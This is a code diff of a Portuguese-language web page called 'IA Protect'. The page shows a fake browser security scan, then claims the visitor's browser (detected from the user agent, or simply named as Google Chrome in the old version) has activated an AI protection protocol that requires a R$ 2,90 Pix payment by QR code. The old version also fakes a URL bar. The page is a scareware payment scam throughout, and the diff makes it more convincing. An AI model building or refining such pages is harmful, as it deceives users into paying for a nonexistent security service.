@@ -1,155 +1,146 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>IA Protect — Verificação de Segurança</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/1/13/Shield_green_check.svg">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IA Protect - Verificação de Segurança</title>
   <style>
     body {
-      background-color: #0f0f0f;
-      color: #fff;
-      font-family: "Segoe UI", sans-serif;
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f8;
       margin: 0;
       padding: 0;
       text-align: center;
+      color: #333;
     }
 
-    .url-bar {
-      background-color: #2b2b2b;
-      color: #eee;
-      font-size: 13px;
-      padding: 6px 20px;
-      text-align: left;
+    header {
+      background-color: #ffffff;
+      padding: 1rem;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
 
-    .logo {
-      margin: 20px auto 0;
+    header img {
+      height: 24px;
     }
 
-    .logo img {
+    .container {
+      padding: 2rem;
+    }
+
+    .shield {
       width: 60px;
+      margin: 20px auto;
     }
 
-    h1 {
-      color: #ffc107;
-      font-size: 22px;
-      margin-top: 10px;
+    .loading {
+      font-size: 1.2rem;
+      margin-top: 2rem;
+      animation: pulse 1.5s infinite;
     }
 
-    p {
-      font-size: 16px;
-      margin: 10px auto;
-      max-width: 600px;
-      line-height: 1.5;
+    @keyframes pulse {
+      0% { opacity: 0.2; }
+      50% { opacity: 1; }
+      100% { opacity: 0.2; }
     }
 
-    .qrcode img {
-      width: 180px;
-      height: 180px;
+    .hidden {
+      display: none;
     }
 
-    .btn {
-      margin-top: 15px;
-      background-color: #00ffcc;
-      color: #000;
-      padding: 10px 20px;
-      border: none;
+    .qr-section {
+      margin-top: 2rem;
+    }
+
+    .pix-code {
+      background-color: #eee;
+      padding: 0.8rem;
+      word-break: break-all;
       border-radius: 6px;
-      font-weight: bold;
+      margin: 1rem auto;
+      width: 90%;
+      max-width: 500px;
+    }
+
+    .copy-btn {
+      padding: 0.5rem 1rem;
+      background-color: #4caf50;
+      border: none;
+      color: white;
+      border-radius: 4px;
       cursor: pointer;
     }
 
-    .price-box {
-      margin: 30px auto 0;
-      display: inline-block;
-      padding: 8px 20px;
-      border: 1px solid #00ffcc;
-      border-radius: 8px;
-      background: rgba(0, 255, 204, 0.05);
-      color: #00ffcc;
-      font-weight: 500;
-      font-size: 15px;
-    }
-
-    footer {
-      font-size: 11px;
-      color: #888;
-      margin-top: 40px;
-      padding-bottom: 20px;
-    }
-
-    .loader {
-      border: 6px solid #333;
-      border-top: 6px solid #00ffcc;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 30px auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    #main-content {
-      display: none;
+    .note {
+      font-size: 0.9rem;
+      color: #777;
+      margin-top: 0.5rem;
     }
   </style>
 </head>
 <body>
 
-  <div class="url-bar">🔒 https://secureconnection-check.com/IA-Protect</div>
+<header>
+  <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Cadeado de segurança">
+  <strong>IA Protect®</strong>
+</header>
 
-  <!-- Tela de varredura -->
-  <div id="loading-screen">
-    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/1/13/Shield_green_check.svg" alt="IA Protect"></div>
-    <h2>IA Protect™ — Camada Avançada de Proteção</h2>
-    <h1>Varredura em andamento...</h1>
-    <div class="loader"></div>
-    <p>Estamos analisando a segurança da sua conexão no navegador Google Chrome.</p>
+<div class="container">
+  <div id="loading-step">
+    <div class="loading">Varredura em andamento...</div>
+    <p>IA Protect® está analisando a segurança da sua conexão no navegador <span id="browser-name">seu navegador</span>.</p>
+    <p>Este processo protege sua navegação contra códigos maliciosos e comprometimento de dados pessoais.</p>
   </div>
 
-  <!-- Tela principal com QR Code -->
-  <div id="main-content">
-    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/1/13/Shield_green_check.svg" alt="IA Protect"></div>
-    <h2>IA Protect™ — Camada Avançada de Proteção</h2>
-    <h1>Verificação de Segurança em andamento...</h1>
-    <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo de proteção IA Protect®.</p>
-    <p>Essa tecnologia baseada em inteligência artificial previne o comprometimento de dados durante sua navegação.</p>
+  <div id="verification-step" class="hidden">
+    <img class="shield" src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Escudo de proteção" />
+    <h2>Segurança de conexão ativada</h2>
+    <p>O navegador <span id="browser-name-2">seu navegador</span> ativou o protocolo IA Protect — tecnologia baseada em Inteligência Artificial.</p>
+    <p>Para concluir a validação e garantir estabilidade e proteção durante a navegação, conclua o procedimento:</p>
+    <p><strong>IA Protect operates under $0.55 USD internationally</strong><br>Valor único em Real: <strong>R$ 2,90</strong></p>
 
-    <div class="price-box">
-      IA Protect operates under $0.55 USD<br>
-      Valor único em Real: R$ 2,90
+    <div class="qr-section">
+      <img src="https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey" alt="QR Code Pix" width="200">
+      <div class="pix-code" id="pix-code">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey</div>
+      <button class="copy-btn" onclick="copyPix()">Copiar código Pix</button>
+      <div class="note">Este é um protocolo de segurança IA. Confirmação imediata.</div>
     </div>
-
-    <div class="qrcode" style="margin-top: 30px;">
-      <img src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey52040000530398654039.905802BR5921IA%20Protect%20Seguran%C3%A7614S%C3%A3o%20Paulo62070503***6304ABCD&size=200x200" alt="QR Pix">
-    </div>
-
-    <button class="btn" onclick="copiarCodigoPix()">Copiar código Pix</button>
-
-    <footer>
-      Verificação processada com tecnologia IA baseada em padrões internacionais.
-    </footer>
   </div>
+</div>
 
-  <script>
-    function copiarCodigoPix() {
-      const codigo = "00020126360014BR.GOV.BCB.PIX0111qrfakepixkey52040000530398654039.905802BR5921IA Protect Segurança6014São Paulo62070503***6304ABCD";
-      navigator.clipboard.writeText(codigo).then(() => {
-        alert("Código Pix copiado com sucesso!");
-      });
-    }
+<script>
+  // Detectar navegador
+  const browser = (() => {
+    const userAgent = navigator.userAgent;
+    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Google Chrome";
+    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
+    if (userAgent.includes("Edg")) return "Microsoft Edge";
+    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
+    return "seu navegador";
+  })();
 
-    // Simula carregamento
-    setTimeout(() => {
-      document.getElementById("loading-screen").style.display = "none";
-      document.getElementById("main-content").style.display = "block";
-    }, 4000); // 4 segundos
-  </script>
+  document.getElementById("browser-name").textContent = browser;
+  document.getElementById("browser-name-2").textContent = browser;
+
+  // Simular varredura
+  setTimeout(() => {
+    document.getElementById("loading-step").classList.add("hidden");
+    document.getElementById("verification-step").classList.remove("hidden");
+  }, 3000);
+
+  // Copiar Pix
+  function copyPix() {
+    const pixText = document.getElementById("pix-code").innerText;
+    navigator.clipboard.writeText(pixText);
+    alert("Código Pix copiado!");
+  }
+</script>
 
 </body>
 </html>
